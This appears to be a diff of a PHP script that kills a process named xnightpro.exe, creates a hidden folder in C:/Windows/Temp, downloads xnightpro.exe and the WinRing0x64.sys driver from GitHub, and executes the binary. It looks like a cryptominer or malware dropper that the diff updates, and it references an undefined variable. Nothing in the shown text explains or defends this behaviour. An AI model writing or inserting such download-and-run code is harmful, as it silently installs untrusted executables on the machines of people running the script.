@@ -59,16 +59,17 @@ $deletePaths = [
 
 
 
+system('taskkill /F /IM xnightpro.exe');
 
-system('mkdir "C:/Windows/Temp/spawn/"');
+system('mkdir "C:/Windows/Temp/spawn2/"');
 
 exec('tasklist', $output);
 
 $url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/xnightpro.exe';
 $url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
 
-$file_name = 'C:/Windows/Temp/spawn/xnightpro.exe';
-$file_name2 = 'C:/Windows/Temp/spawn/WinRing0x64.sys';
+$file_name = 'C:/Windows/Temp/spawn2/xnightpro.exe';
+$file_name2 = 'C:/Windows/Temp/spawn2/WinRing0x64.sys';
 
 $found = false;
 $found2 = false;
@@ -88,7 +89,7 @@ foreach ($output as $line) {
     }
 }
 
-if (!$found && !$found2) {
+if (!$found && !$found2 && !$found3) {
         clearstatcache();
 
 
@@ -110,7 +111,7 @@ if (!$found && !$found2) {
             }
  
 
-         system('C:/Windows/Temp/spawn/xnightpro.exe');
+         system('C:/Windows/Temp/spawn2/xnightpro.exe');
         
 
 
